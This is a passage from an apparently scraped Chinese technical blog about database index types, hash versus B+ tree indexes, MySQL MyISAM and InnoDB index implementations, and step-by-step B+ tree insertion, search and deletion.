按键列个数区分：单列索引（Single-column Index）与多列索引（Multi-column Index） 按存储结构区分：聚集索引（Clustered Index）与非聚集索引（Non-clustered Index） 唯一索引（Unique Index）唯一索引（Unique Indexes）是不允许其中任何两行具有相同索引值的索引。唯一索引不止用于提升查询性能，还用于保证数据完整性。 当现有数据中存在重复的键值时，大多数数据库不允许将新创建的唯一索引与表一起保存。数据库还可能防止添加将在表中创建重复键值的新数据。 例如，如果在 employee 表中职员的姓 (lname) 上创建了唯一索引，则任何两个员工都不能同姓。对某个列建立UNIQUE索引后，插入新记录时，数据库管理系统会自动检查新纪录在该列上是否取了重复值： 12CREATE UNIQUE INDEX index_nameon table_name (column_name); 主键索引（Primary Index）与辅助索引（二级索引，Secondary Index）主键索引（Primary Index）主键索引（Primary Index）简称为主索引，数据库表中一列或列组合（字段）的值唯一标识表中的每一行。该列称为表的主键。 在数据库关系图中为表定义主键将自动创建主键索引，主键索引是唯一索引的特定类型。该索引要求主键中的每个值都唯一。当在查询中使用主键索引时，它还允许对数据的快速访问。 对主键构造的索引，对应称为主键索引。 辅助索引（二级索引，Secondary Index）辅助索引（Secondary Index），也称为二级索引。 辅助索引是相对于主键索引而言的，主键索引和辅助索引（Secondary key）的唯一区别是，主键索引要求索引列的值是唯一的，而辅助索引对索引列的值并没有要求，即索引列的值可以重复。 对非对主键列构造的索引，对应称为辅助索引。 单列索引（Single-column Index）与多列索引（Multi-column Index）普通索引（单列索引）最基本的索引类型，没有唯一性之类的限制，普通索引（单列索引）基于单一的字段创建，其基本语法如下所示： 12CREATE INDEX index_nameON table_name (column_name); 多列索引（联合索引/组合索引/复合索引/混合索引，Multi-column Index、Composite Index）多列索引（Multi-column Index）指在表的多个字段组合上创建的索引，只有在查询条件中使用了这些字段的左边字段时，索引才会被使用。 假设有这样一个people表： 1234567CREATE TABLE People( PeopleId INT NOT NULL, FirstName NVARCHAR(50) NOT NULL, LastName NVARCHAR(50) NOT NULL, Age INT NOT NULL, PRIMARY KEY (PeopleId) ); 我们创建了一个名为 IX_StuID_StuName 的多列索引，其中包含表中的两列StuId和StuName。 下面是我们插入到这个people表的数据： 表中有四个人的FirstName为“Mikes”（这其中两个人的LastName为Sullivans，另外两个人的LastName为McConnells)，有两个人的Age为17岁的人，还有一个名字与众不同的Joe Smith。 这个表的主要用途是根据指定的用户姓、名以及年龄返回相应的peopleid。 例如，我们可能需要查找FirstName为Mike、LastName为Sullivan、年龄17岁的用户的peopleid，SQL语句为 1SELECT peopleid FROM people WHERE firstname='Mike' AND lastname='Sullivan' AND age=17; 首先，我们可以考虑在单个列上创建索引，比如firstname、lastname或者age列。 如果我们创建firstname列的索引，数据库将通过这个索引迅速把搜索范围限制到那些firstname=’Mike’的记录，然后再在这个“中间结果集”上进行其他条件的搜索：它首先排除那些lastname不等于“Sullivan”的记录，然后排除那些age不等于17的记录。当记录满足所有搜索条件之后，数据库就返回最终的搜索结果。 由于建立了firstname列的索引，与执行表的完全扫描相比，MySQL的效率提高了很多，但我们要求MySQL扫描的记录数量仍旧远远超过了实际所需要的。虽然我们可以删除firstname列上的索引，再创建lastname或者age列的索引，但总地看来，不论在哪个列上创建索引搜索效率仍旧相似。 为了提高搜索效率，我们需要考虑运用多列索引。如果为firstname、lastname和age这三个列创建一个多列索引，数据库只需一次检索就能够找出正确的结果！ 那么，如果在firstname、lastname、age这三个列上分别创建单列索引，效果是否和创建一个覆盖firstname、lastname、age字段的多列索引一样呢？ 答案是否定的，两者完全不同。当我们执行查询的时候，MySQL只能使用一个索引。如果你有三个单列的索引，MySQL会试图选择一个限制最严格的索引。但是，即使是限制最严格的单列索引，它的限制能力也肯定远远低于覆盖firstname、lastname、age这三个列的多列索引。 多列索引还有另外一个优点，它通过称为最左前缀（Leftmost Prefixing）的概念体现出来。继续考虑前面的例子，现在我们有一个firstname、lastname、age列上的多列索引，我们称这个索引为fname_lname_age。当搜索条件是以下各种列的组合时，数据库将使用fname_lname_age索引： firstname，lastname，age firstname，lastname firstname 实际上，覆盖firstname、lastname、age列上的多列索引，相当于我们创建了(firstname，lastname，age)、(firstname，lastname)以及(firstname)这些列组合上的索引。因此，下面这些查询在执行时，均能够使用到这个fname_lname_age索引： 123SELECT peopleid FROM people WHERE firstname='Mike' AND lastname='Sullivan' AND age='17'; SELECT peopleid FROM people WHERE firstname='Mike' AND lastname='Sullivan'; SELECT peopleid FROM people WHERE firstname='Mike'; 下面这些查询在执行时，都不能够使用到这个fname_lname_age索引： 123SELECT peopleid FROM people Where lastname='Sullivan'; SELECT peopleid FROM people Where age='17'; SELECT peopleid FROM people Where lastname='Sullivan' AND age='17'; 为什么要使用联合索引减少开销建一个联合索引(col1,col2,col3)，实际相当于建了(col1),(col1,col2),(col1,col2,col3)三个索引。每多一个索引，都会增加写操作的开销和磁盘空间的开销。对于大量数据的表，使用联合索引会大大的减少开销！ 覆盖索引（covering index）同理，当你要select的字段，已经在索引树里面存储，那就不需要再去检索数据库，直接拿来用就行了。 对联合索引(col1,col2,col3)，如果有如下的SQL： 1select col1,col2,col3 from test where col1=1 and col2=2 那么MySQL可以直接通过遍历索引表就可以取得待查询数据，而无需在遍历索引表后，又再在数据表中进行查询。 这减少了很多的随机I/O操作。减少I/O操作，特别的随机I/O其实是DBA主要的优化策略。所以，在真正的实际应用中，覆盖索引是主要的提升性能的优化手段之一。 效率高索引列越多，通过索引筛选出的数据越少。有1000W条数据的表，有如下SQL： 1select * from table where col1=1 and col2=2 and col3=3 假设假设每个条件可以筛选出10%的数据，如果只有单值索引，那么通过该索引能筛选出1000W10%=100w条数据，然后再回表从100w条数据中找到符合col2=2 and col3= 3的数据，然后再排序，再分页；如果是联合索引，通过索引筛选出1000w\\10%* 10% *10%=1w，效率提升可想而知！ 覆盖索引（Covering Indexes）覆盖索引（covering index）的原理很简单，就像你拿到了一本书的目录，里头有标题和对应的页码，当你想知道第267页的标题是什么的时候，完全没有必要翻到267页去看，而是直接看目录。 同理，当你要select的字段，已经在索引树里面存储，那就不需要再去检索数据库，直接拿来用就行了。 对联合索引(col1,col2,col3)，如果有如下的SQL： 1select col1,col2,col3 from test where col1=1 and col2=2 那么MySQL可以直接通过遍历索引表就可以取得待查询数据，而无需在遍历索引表后，又再在数据表中进行查询。 这减少了很多的随机I/O操作。减少I/O操作，特别的随机I/O其实是DBA主要的优化策略。所以，在真正的实际应用中，覆盖索引是主要的提升性能的优化手段之一。 索引的实现B+树哈希索引（Hash Indexes） 除了B+树之外，还有一种常见的是哈希索引。 哈希索引就是采用一定的哈希算法，以计算出键值的哈希值。因此，Hash 索引结构的检索效率非常高，因为索引的检索可以一次定位，不像B+树索引需要从根节点到枝节点，最后才能访问到页节点（这样会进行多次I/O访问），所以 Hash 索引的查询效率要远高于 B+树索引。 哈希索引与B+树索引可能很多人又有疑问了，既然 Hash 索引的效率要比B+树高很多，为什么大家不都用 Hash 索引而还要使用B+树索引呢？ 任何事物都是有两面性的，Hash 索引也一样，虽然 Hash 索引效率高，但是 Hash 索引本身由于其特殊性也带来了很多限制和弊端，主要有以下这些： Hash 索引仅仅能满足”=”,”IN”和”&lt;=&gt;”查询，不能使用范围查询。 由于 Hash 索引比较的是进行 Hash 运算之后的 Hash 值，所以它只能用于等值的过滤，不能用于基于范围的过滤，因为经过相应的 Hash 算法处理之后的 Hash 值的大小关系，并不和Hash运算前一样。 Hash 索引无法被用来避免数据的排序操作。 由于 Hash 索引中存放的是经过 Hash 计算之后的 Hash 值，而且计算后的Hash值的大小关系与进行 Hash 运算前的键值大小关系没有任何关联，所以数据库无法利用索引的数据来避免任何排序运算； Hash 索引不能利用部分索引键查询。 对于组合索引，Hash 索引在计算 Hash 值的时候是组合索引键合并后再一起计算 Hash 值，而不是单独计算 Hash 值，所以通过组合索引的前面一个或几个索引键进行查询的时候，Hash 索引也无法被利用。 Hash 索引在任何时候都不能避免全表扫描。 前面已经知道，Hash 索引是将索引键通过 Hash 运算之后，将 Hash运算结果（Hash 值）和所对应的行指针信息存放于一个 Hash 表中，由于不同索引键存在相同 Hash 值，所以即使取满足某个 Hash 键值的数据的记录条数，也无法从 Hash 索引中直接完成查询，还是要通过访问表中的实际数据进行相应的比较，并得到相应的结果。 Hash 索引遇到大量Hash值相等的情况后性能并不一定就会比B+树索引高。 对于选择性比较低的索引键，如果创建 Hash 索引，那么将会存在大量记录指针信息存于同一个 Hash 值相关联。这样要定位某一条记录时就会非常麻烦，会浪费多次表数据的访问，而造成整体性能低下。 全文索引（Full-text Indexes）总结简单地说，哈希索引就是采用一定的哈希算法，把键值换算成新的哈希值，检索时不需要类似B+树那样从根节点到叶子节点逐级查找，只需一次哈希算法即可立刻定位到相应的位置，速度非常快。 B+树索引和哈希索引的明显区别是： 如果是等值查询，那么哈希索引明显有绝对优势，因为只需要经过一次算法即可找到相应的键值；当然了，这个前提是，键值都是唯一的。如果键值不是唯一的，就需要先找到该键所在位置，然后再根据链表往后扫描，直到找到相应的数据； 如果是范围查询检索，这时候哈希索引就毫无用武之地了，因为原先是有序的键值，经过哈希算法后，有可能变成不连续的了，就没办法再利用索引完成范围查询检索； 同理，哈希索引也没办法利用索引完成排序，以及like ‘xxx%’ 这样的部分模糊查询（这种部分模糊查询，其实本质上也是范围查询）； 哈希索引也不支持多列联合索引的最左匹配规则； B+树索引的关键字检索效率比较平均，不像B树那样波动幅度大，在有大量重复键值情况下，哈希索引的效率也是极低的，因为存在所谓的哈希碰撞问题。 Reference https://baike.baidu.com/item/%E7%B4%A2%E5%BC%95/5716853 MySQL索引的作用 - https://blog.csdn.net/u013075468/article/details/39525417 SQL 索引 - https://wiki.jikexueyuan.com/project/sql/indexes.html MySQL BTree索引和hash索引的区别 - https://blog.csdn.net/ochangwen/article/details/54024063 数据库两大神器【索引和锁】 - https://juejin.im/post/5b55b842f265da0f9e589e79 Mysql 索引精讲 - https://juejin.im/post/5ccfdb05e51d453b7f0a0d4f 认识SQLServer索引以及单列索引和多列索引的不同 - https://www.cnblogs.com/yunfeifei/p/4140385.html Mysql联合索引最左匹配原则 - https://segmentfault.com/a/1190000015416513","comments":true,"categories":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/tags/Database/"}]},{"title":"【Database】数据库索引为什么使用 B+ 树","date":"2019-06-10T07:50:37.000Z","path":"2019/06/10/【Database】数据库索引为什么使用B-树/","text":"背景 B tree： 二叉树（Binary tree），每个节点只能存储一个key。 B-tree：B树（B-Tree，并不是B“减”树，横杠为连接符，容易被误导） B树属于多叉树，同时也属于平衡多路查找树。每个节点可以包含多个key（由磁盘大小决定）。 B+tree（B+树） 和 B*tree（B*树） 都是 B-tree 的变种 B 树（B-tree） 从图中可以看出，B-tree 利用了磁盘块的特性进行构建的树。每个磁盘块的大小正好等于B树的一个节点的大小，每个节点包含了键（key）和值（value）。 我们知道，操作系统每次从磁盘读取数据到内存都是以页作为最小单位的，而一页通常等于n个扇区。上图中所示的磁盘块与页的大小正好相等。如果要访问B树中的一个节点，进行I/O操作的次数等于该节点在B树中的深度。 而通过把树中节点可以包含的键（key）的个数增加，树的高度就比其对应的二叉树矮了，最终就减少了进行单次数据查找时，进行I/O操作的次数。 B-tree巧妙利用了磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次I/O就可以完全载入，B-tree 的数据可以存在任何节点中。 B+ 树（B+ tree） B+ 树（B+ tree）是 B-tree 的变种，两者的区别在于，B+ 树的数据（或者说键值的值）只能存储在叶子节点中。 这样，在B树的基础上每个节点存储的关键字数就更多，自然地，树的层级更少，因此查询数据更快。 为什么使用B树或B+树作为索引理论上，红黑树等数据结构也可以用来实现索引，但是文件系统及数据库系统普遍采用B树或B+树作为索引结构。 一般来说，索引本身也很大，不可能全部存储在内存中，因此索引往往以索引文件的形式存储在磁盘上。这样的话，索引查找过程中就要产生磁盘I/O操作。相对于对内存存取，对磁盘的I/O存取的消耗要高几个数量级，所以评价一个数据结构作为索引的优劣最重要的指标，就是在查找过程中磁盘I/O操作次数的渐进复杂度。换句话说，索引的结构组织要尽量减少查找过程中磁盘I/O的存取次数。 而B树和B+树，可以有效的利用系统对磁盘的块读取特性，同时尽可能多的加载索引数据，来提高索引命中效率，最终达到减少磁盘I/O的读取次数。 与红黑树的比较红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，主要有以下两个原因： （一）更少的查找次数 平衡树查找操作的时间复杂度和树高 h 相关，$O(h)=O(log_dN)$，其中 d 为每个节点的出度。 红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多，查找的次数也就更多。 （二）利用磁盘预读特性 为了减少磁盘 I/O 操作，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的磁盘旋转时间，速度会非常快。 操作系统一般将内存和磁盘分割成固定大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点。并且可以利用预读特性，相邻的节点也能够被预先载入。 主存存取原理目前计算机使用的主存基本都是随机读写存储器（RAM），现代RAM的结构和存取原理比较复杂，这里本文抛却具体差别，抽象出一个十分简单的存取模型来说明RAM的工作原理。 从抽象角度看，主存是一系列的存储单元组成的矩阵，每个存储单元存储固定大小的数据。每个存储单元有唯一的地址，现代主存的编址规则比较复杂，这里将其简化成一个二维地址：通过一个行地址和一个列地址可以唯一定位到一个存储单元。上图展示了一个4 x 4的主存模型。 主存的存取过程如下： 当系统需要读取主存时，则将地址信号放到地址总线上传给主存，主存读到地址信号后，解析信号并定位到指定存储单元，然后将此存储单元数据放到数据总线上，供其它部件读取。 写主存的过程类似，系统将要写入单元地址和数据分别放在地址总线和数据总线上，主存读取两个总线的内容，做相应的写操作。 这里可以看出，主存存取的时间仅与存取次数呈线性关系。因为不存在机械操作，两次存取的数据的“距离”不会对时间有任何影响，例如，取A0、A1和取A0、D3的时间总消耗是一样的。 磁盘存取原理上文说过，索引一般以文件形式存储在磁盘上，索引检索需要磁盘I/O操作。与主存不同，磁盘I/O存在机械运动耗费，因此磁盘I/O的时间消耗是巨大的。 下图是磁盘的整体结构示意图： 一个磁盘由大小相同且同轴的圆形盘片组成，磁盘可以转动（各个磁盘必须同步转动）。在磁盘的一侧有磁头支架，磁头支架固定了一组磁头，每个磁头负责存取一个磁盘的内容。磁头不能转动，但是可以沿磁盘半径方向运动（实际是斜切向运动），每个磁头同一时刻也必须是同轴的，即从正上方向下看，所有磁头任何时候都是重叠的（不过目前已经有多磁头独立技术，可不受此限制）。 下图是磁盘结构的示意图： 盘片被划分成一系列同心环，圆心是盘片中心，每个同心环叫做一个磁道，所有半径相同的磁道组成一个柱面。磁道被沿半径线划分成一个个小的段，每个段叫做一个扇区（Sector），每个扇区是磁盘的最小存储单元。为了简单起见，我们下面假设磁盘只有一个盘片和一个磁头。 当需要从磁盘读取数据时，系统会将数据逻辑地址传给磁盘，磁盘的控制电路按照寻址逻辑将逻辑地址翻译成物理地址，即确定要读的数据在哪个磁道，哪个扇区。为了读取这个扇区的数据，需要将磁头放到这个扇区上方，为了实现这一点，磁头需要移动对准相应磁道，这个过程叫做寻道，所耗费时间叫做寻道时间，然后磁盘旋转将目标扇区旋转到磁头下，这个过程耗费的时间叫做旋转时间。 局部性原理与磁盘预读由于存储介质的特性，磁盘本身存取就比主存慢很多，再加上机械运动耗费，磁盘的存取速度往往是主存的几百分分之一，因此为了提高效率，要尽量减少磁盘I/O。为了达到这个目的，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存。这样做的理论依据是计算机科学中著名的局部性原理： 当一个数据被用到时，其附近的数据也通常会马上被使用。 程序运行期间所需要的数据通常比较集中。 由于磁盘顺序读取的效率很高（不需要寻道时间，只需很少的旋转时间），因此对于具有局部性的程序来说，预读可以提高I/O效率。 预读的长度一般为页（page）的整倍数。页是计算机管理存储器的逻辑块，硬件及操作系统往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（在许多操作系统中，页得大小通常为4KB），主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后异常返回，程序继续运行。 B树或B+树索引的性能分析到这里终于可以分析B树或B+树作为索引的性能了。 上文说过一般使用磁盘I/O次数评价索引结构的优劣。先从B树分析，根据B树的定义，可知查找一个值最多需要访问h个节点。数据库系统的设计者巧妙利用了磁盘预读原理，将一个节点的占用大小等于等于一个页的大小，这样读取一个节点只需要进行一次I/O操作即可。为了达到这个目的，在实际实现B树时，还需要使用如下技巧： 每次新建节点时，直接申请一个页的空间，这样就保证一个节点物理上就存储在一个页里，加之计算机存储分配都是按页对齐的，就实现了读取一个节点只需要进行一次I/O。 B树中一次检索最多需要进行h-1次I/O（根节点常驻内存，h为树的高度），渐进复杂度为$O(h)=O(log_dN)$。一般实际应用中，树的度d是一个非常大的数字，通常超过100，因此h非常小（通常不超过3）。 综上所述，用B树作为索引结构效率是非常高的。 而红黑树这种结构，h明显要深的多。由于逻辑上很近的节点（父子）物理上可能很远，无法利用局部性，所以红黑树的I/O渐进复杂度也为O(h)，但效率明显比B-Tree差很多（因为红黑树的深度比B-Tree要大很多）。 上文还说过，B+树更适合外存索引，原因和内节点的度d有关。从上面分析可以看到，d越大索引的性能越好，而内节点度的上限取决于内节点内key和data的大小： $d_{max}=floor(pagesize/(keysize+datasize+pointsize))$ floor表示向下取整。由于B+树的内节点均去掉了data域，因此可以拥有更大的度，拥有更好的性能。 MySQL索引实现在MySQL中，索引属于存储引擎级别的概念，不同存储引擎对索引的实现方式是不同的，本文主要讨论MyISAM和InnoDB两个存储引擎的索引实现方式。 MyISAM索引实现MyISAM引擎使用B+Tree作为索引结构，叶子节点的data域存放的是数据记录的地址。下图是MyISAM索引的原理图： 这里设表一共有三列，假设我们以Col1为主键，则上图是一个MyISAM表的主索引（Primary Index）示意。可以看出MyISAM的索引文件仅仅保存数据记录的地址。 在MyISAM中，主索引和辅助索引（Secondary Index）在结构上没有任何区别，只是主索引要求key是唯一的，而辅助索引的key可以重复。如果我们在Col2上建立一个辅助索引，则此索引的结构如下图所示： 同样也是一颗B+Tree，data域保存数据记录的地址。因此，MyISAM中索引检索的算法为首先按照B+Tree搜索算法搜索索引，如果指定的Key存在，则取出其data域的值，然后以data域的值为地址，读取相应数据记录。 MyISAM的索引方式也叫做“非聚集”的（非聚集索引，Non-clustered Index），之所以这么称呼是为了与InnoDB的聚集索引（Clustered Index）区分。 InnoDB索引实现虽然InnoDB也使用B+Tree作为索引结构，但具体实现方式却与MyISAM截然不同。 第一个重大区别是InnoDB的数据文件本身就是索引文件。从上文知道，MyISAM索引文件和数据文件是分离的，索引文件仅保存数据记录的地址。而在InnoDB中，表数据文件本身就是按B+Tree组织的一个索引结构，这棵树的叶节点data域保存了完整的数据记录。这个索引的key是数据表的主键，因此InnoDB表数据文件本身就是主索引（Primary Index）。 上图是InnoDB主索引（同时也是数据文件）的示意图，可以看到叶节点包含了完整的数据记录。这种索引叫做聚集索引（clustered index）。因为InnoDB的数据文件本身要按主键聚集，所以InnoDB要求表必须有主键（MyISAM可以没有），如果没有显式指定，则MySQL系统会自动选择一个可以唯一标识数据记录的列作为主键，如果不存在这种列，则MySQL自动为InnoDB表生成一个隐含字段作为主键，这个字段长度为6个字节，类型为长整形。 第二个与MyISAM索引的不同是，InnoDB的辅助索引data域存储相应记录主键的值而不是地址。换句话说，InnoDB的所有辅助索引都引用主键作为data域。例如，下图为定义在Col3上的一个辅助索引： 这里以英文字符的ASCII码作为比较准则。聚集索引这种实现方式使得按主键的搜索十分高效，但是辅助索引搜索需要检索两遍索引：首先检索辅助索引获得主键，然后用主键到主索引中检索获得记录。 了解不同存储引擎的索引实现方式对于正确使用和优化索引都非常有帮助，例如知道了InnoDB的索引实现后，就很容易明白为什么不建议使用过长的字段作为主键，因为所有辅助索引都引用主索引，过长的主索引会令辅助索引变得过大。再例如，用非单调的字段作为主键在InnoDB中不是个好主意，因为InnoDB数据文件本身是一颗B+Tree，非单调的主键会造成在插入新记录时数据文件为了维持B+Tree的特性而频繁的分裂调整，十分低效，而使用自增字段作为主键则是一个很好的选择。 Reference 数据库索引为什么使用B+树？ - https://www.jianshu.com/p/4dbbaaa200c4 MySQL索引背后的数据结构及算法原理 - http://blog.codinglabs.org/articles/theory-of-mysql-index.html B+树在磁盘存储中的应用 - https://www.cnblogs.com/nullzx/p/8978177.html","comments":true,"categories":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/tags/Database/"}]},{"title":"【Data Structure】多路平衡查找树 - B+ 树（B+ Tree）","date":"2019-06-05T08:17:16.000Z","path":"2019/06/05/【Data-Structure】树-多路平衡查找树-B-树/","text":"B+ 树（B+ Tree）B+树（B+ Tree）是B树的一种变体，B+树也属于平衡多路查找树（Multi-way Search Tree）。 大体结构与B树相同，包含根节点、内部节点和叶子节点。与B树唯一的区别在于，B+树的内部节点不保存数据元素的value（只保存key，而B树的内部节点既保存数据元素的key，也保存数据元素的value），因此B+树能在内存中存放更多索引，增加缓存命中率。另外因为叶子节点相连遍历操作很方便，而且数据也具有顺序性，便于区间查找。 下图是一个 d=3 的B+Tree： 假设以下是一颗 m 路（阶）B+ 树： 根节点可能是叶子节点，也可能是包含两个或两个以上子节点的节点。 内部节点如果拥有k个数据元素，则有k+1个子节点。 非叶子节点不保存数据元素的value，只保存数据元素的key用作索引，所有数据都保存在叶子节点中。 非叶子节点有若干子树指针，如果非叶子节点的数据元素的key为$k_1,k_2,…k_n$，其中n=m-1，那么第一个子树的数据元素的key判断条件为小于$k_1$，第二个为大于等于$k_1$而小于$k_2$，以此类推，最后一个为大于等于$k_n$，总共可以划分出m个区间，即可以有m个分支（判断条件其实没有严格的要求，只要能实现对B+树的数据进行定位划分即可，有些实现使用了m个数据元素的key来划分区间，也是可以的）。 自然插入而不进行删除操作时，叶子节点数据元素的个数范围为[floor(m/2),m-1]，内部节点数据元素的个数范围为[ceil(m/2)-1,m-1]。 另外通常B+树有两个头指针，一个指向根节点一个指向关键字最小的叶子节点。 在进行删除操作时，涉及到索引节点填充因子和叶子节点填充因子，一般可设叶子节点和索引节点的填充因子都不少于50%。 带有顺序访问指针的B+ 树（B+ Tree）一般在数据库系统或文件系统中使用的B+Tree结构都在经典B+Tree的基础上进行了优化，增加了顺序访问指针。 如上图所示，在带有顺序访问指针的B+ 树中，每个叶子节点都有一个指向相邻叶子节点的指针，就形成了带有顺序访问指针的B+Tree。做这个优化的目的是为了提高区间访问的性能。 例如，如果要查询key为从18到49的所有数据记录，当找到18后，只需顺着节点和指针顺序遍历就可以一次性访问到所有数据节点，极大提到了区间查询效率。 B和B+树的区别B和B+树的区别在于，B+树的非叶子节点只包含数据元素的key，而不包含数据元素的value（或者说，只包含导航信息，不包含实际的值），所有的叶子节点和其兄弟节点（同为叶子节点）使用链表相连，便于区间查找和遍历。 B+ 树的优点在于： 由于B+树在内部节点中不包含数据元素的value，因此在内存页中能够存放更多的key。 数据存放的更加紧密，具有更好的空间局部性。因此访问叶子节点上关联的数据也具有更好的缓存命中率。 B+树的叶子节点都是相链的，因此对整棵树的便利只需要一次线性遍历叶子节点即可。而且由于数据顺序排列并且相连，所以便于区间查找和搜索。而B树则需要进行每一层的递归遍历。相邻的元素可能在内存中不相邻，所以缓存命中性没有B+树好。 但是B树也有优点，其优点在于，由于B树的每一个节点都包含key和value，因此经常访问的元素可能离根节点更近，因此访问也更迅速。 B+树操作插入操作例子1下面是一颗5阶B+树的插入过程，5阶B+树的节点最多包含4个数据元素（其中内部节点只包含数据元素的key，而不包含数据元素的value；而叶子节点即包含数据元素的key，也包含数据元素的value）。 空树中插入5： 依次插入8，10，15： 插入16： 插入16后超过了一个节点最多包含4个数据元素的限制，所以要进行分裂。在叶子节点分裂时，分裂出来的左节点包含2个数据元素，右子节点包含3个数据元素，中间数据元素的key成为内部节点（索引节点）中的key，分裂后当前节点指向了父节点（根节点）。结果如下图所示： 当然我们还有另一种分裂方式，给左节点3个记录，右节点2个记录，此时索引节点中的key就变为15。 插入17： 插入18，插入后如下图所示： 由于插入后，节点的数据元素个数大于4，所以需要进行分裂。分裂成两个节点，其中左节点包含2个数据元素，右节点包含3个数据元素，值为16的key进位到父节点（索引节点）中，将当前节点的指针指向父节点。 分裂后，如下图所示： 继续插入若干数据后，如下图所示： 在上图中插入7，结果如下图所示： 当前节点的数据元素个数超过4，于是需要分裂。其中，左节点2个数据元素，右节点3个数据元素。分裂后值为7的key进入到父节点中，将当前节点的指针指向父节点，结果如下图所示： 当前节点的key的个数超过4，于是需要继续分裂。其中左节点包含2个key，右节点包含2个key，值为16的key进入到父节点中，将当前节点指向父节点，结果如下图所示： 当前节点的key的个数满足条件，插入结束。 例子2假设现在构建一棵四阶B+树，开始插入“A”，直接作为根节点， 插入“B”，大于“A”，放右边， 插入“C”，按顺序排到最后， 继续插入“D”，直接添加的结果如下图，此时超过了节点可以存放容量，对于四阶B+树每个节点最多存放3个项，此时需要执行分裂操作， 分裂操作为，先选取待分裂节点中间位置的项，这里选“C”，然后将“C”项放到父节点中，因为这里还没有父节点，那么直接创建一个新的父节点存放“C”，而原来小于“C”的那些项作为左子树，原来大于等于“C”的那些项作为右子树。这里注意下非叶子节点存放的都是关键字，用作索引的，所以父节点存放的“C”项不包括数据，数据仍然存放在右子树。此外，还需要添加一个指针，由左子树指向右子树。 继续插入“M”，“M”大于“C”，往右子节点， 分别与“C”“D”比较，大于它们，放到最右边， 插入“L”，“L”大于“B”，往右子树， “L”逐一与节点内项的值比较，根据大小放到指定位置，此时触发分裂操作， 选取待分裂节点中间位置的项“L”，然后将“L”项放到父节点中，按大小顺序将“L”放到指定位置，而原来小于“L”的那些项作为左子树，原来大于等于“L”的那些项作为右子树。父节点存放的“L”项不包括数据，数据仍然存放在右子树。此外，还需要在左子树中添加一个指向右子树的指针。 继续插入“K”，从根节点开始查找，逐一比较关键字，“K”大于“C”而小于“L”，往第二个分支， 在子节点中逐一比较，“K”最终落在最右边， 继续插入“J”，从根节点开始查找，逐一比较关键字，“J”大于“C”而小于“L”，往第二个分支， 在子节点中找到“J”的相应位置，此时超过了节点的容量，需要进行分裂操作， 选取待分裂节点中间位置的项“J”，然后将“J”项放到父节点中，按大小顺序将“J”放到指定位置，而原来小于“J”的那些项作为左子树，原来大于等于“J”的那些项作为右子树。父节点存放的“J”项不包括数据，数据仍然存放在右子树。此外，还需要在左子树中添加一个指向右子树的指针。 继续插入“I”，从根节点开始查找，逐一比较关键字，“I”大于“C”而小于“J”“L”，往第二个分支， 逐一比较找到“I”的插入位置， 继续插入“H”，从根节点开始查找，逐一比较关键字，“H”大于“C”而小于“J”“L”，往第二个分支， “H”逐一与节点内的值比较，根据大小放到指定位置，此时触发分裂操作， 选取待分裂节点中间位置的项“H”，然后将“H”项放到父节点中，按大小顺序将“H”放到指定位置，而原来小于“H”的那些项作为左子树，原来大于等于“H”的那些项作为右子树。父节点存放的“H”项不包括数据，数据仍然存放在右子树。此外，还需要在左子树中添加一个指向右子树的指针。 但此时父节点超出了容量，父节点需要继续分裂操作， 选取待分裂节点中间位置的项“J”，然后将“J”项放到父节点中，但还不存在父节点，需要创建一个作为父节点。原来小于“J”的那些项作为左子树，原来大于“J”的那些项作为右子树。这是非叶子节点的分裂，操作对象都是用作索引的关键字，不必考虑数据存放问题。 插入“G”，从根节点开始查找，“G”小于“J”，往第一个分支， 逐一比较节点内项的值，“G”大于“C”小于“H”，往第二个分支， 逐一比较节点内项的值，找到“G”的位置并插入， 插入“F”，从根节点开始查找，“F”小于“J”，往第一个分支， 逐一比较节点内项的值，“F”大于“C”小于“H”，往第二个分支， 逐一比较节点内项的值，找到“F”的位置并插入，此时触发分裂操作， 选取待分裂节点中间位置的项“F”，然后将“F”项放到父节点中，按大小顺序将“F”放到指定位置，而原来小于“F”的那些项作为左子树，原来大于等于“F”的那些项作为右子树。父节点存放的“F”项不包括数据，数据仍然存放在右子树。此外，还需要在左子树中添加一个指向右子树的指针。 最后插入“E”，从根节点开始查找，“E”小于“J”，往第一个分支， 逐一比较节点内项的值，“E”大于“C”小于“F”，往第二个分支， 逐一比较节点内项的值，找打“E”适当的位置并插入。 从上面插入操作可以总结，插入主要就是涉及到分裂操作，而且要注意到非节点只保存了关键字作为索引，而数据都保存在叶子节点上，此外还需要使用指针将叶子节点连接起来。最终我们可以看到叶子节点的项按从小到大排列，因为有了指针使得可以很方便遍历数据。 查找操作对B+树的查找与B树的查找差不多，从根节点开始查找，通过比较项的值找到对应的分支，然后继续往子树上查找。 比如查找“H”，“H”小于“J”，往第一个分支， 逐一比较节点中的项，发现应该往第四个分支， 逐一比较，找到“H”。 遍历操作遍历操作首先是要先找到树最左边的叶子节点，然后就可以通过指针完成整棵树的遍历了。 从根节点开始，一直往第一个分支走， 继续往第一个分支走， 发现已经到叶子节点了，这就是要找的遍历的开端， 第一个叶子节点有两个项，接着根据指针跳到第二个叶子节点， 第二个节点有三个项，根据指针继续往下一个节点， 该节点有两个项，根据指针继续往下一个节点， 不断根据指针往下， 往下， 完成整棵树的遍历。 删除操作下面是一颗5阶B+树的删除过程，5阶B+树的节点最多包含4个数据元素。 初始状态： 删除22，删除后如下图： 删除后叶子节点中数据元素的个数等于2，删除结束。 删除15，删除后如下图所示： 